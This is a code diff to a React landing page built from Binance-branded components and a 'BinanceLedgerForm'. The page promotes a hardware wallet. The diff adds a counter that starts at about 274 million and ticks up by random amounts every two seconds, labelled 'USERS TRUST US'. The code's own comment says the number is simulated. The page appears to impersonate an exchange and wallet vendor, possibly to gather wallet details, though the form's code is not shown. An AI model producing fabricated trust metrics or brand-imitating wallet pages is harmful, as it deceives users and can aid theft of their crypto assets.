@@ -1,11 +1,27 @@
 
-import React from "react";
+import React, { useState, useEffect } from "react";
 import BinanceHeader from "@/components/BinanceHeader";
 import BinanceFooter from "@/components/BinanceFooter";
 import BinanceLedgerForm from "@/components/BinanceLedgerForm";
 import BinanceAppPromotion from "@/components/BinanceAppPromotion";
 
 const Index = () => {
+  const [userCount, setUserCount] = useState(274368184);
+
+  useEffect(() => {
+    // Simulate counter increasing every few seconds
+    const counterInterval = setInterval(() => {
+      setUserCount(prev => prev + Math.floor(Math.random() * 5) + 1);
+    }, 2000);
+    
+    return () => {
+      clearInterval(counterInterval);
+    };
+  }, []);
+
+  // Format the user count with commas
+  const formattedUserCount = userCount.toLocaleString();
+
   return (
     <div className="min-h-screen flex flex-col bg-binance-dark text-white">
       <BinanceHeader />
@@ -22,6 +38,20 @@ const Index = () => {
                 <p className="text-gray-300 text-sm md:text-base mb-4 md:mb-6 max-w-2xl px-2 md:px-0">
                   Secure your crypto assets with the most trusted hardware wallet in the industry
                 </p>
+                
+                {/* User Counter */}
+                <div className="flex items-center justify-center">
+                  <div className="w-8 h-px bg-binance-yellow my-auto mr-3"></div>
+                  <div className="flex flex-col items-center">
+                    <span className="text-binance-yellow text-lg md:text-xl font-bold">
+                      {formattedUserCount}
+                    </span>
+                    <span className="text-[#848E9C] text-xs uppercase">
+                      USERS TRUST US
+                    </span>
+                  </div>
+                  <div className="w-8 h-px bg-binance-yellow my-auto ml-3"></div>
+                </div>
               </div>
             </div>
           </div>
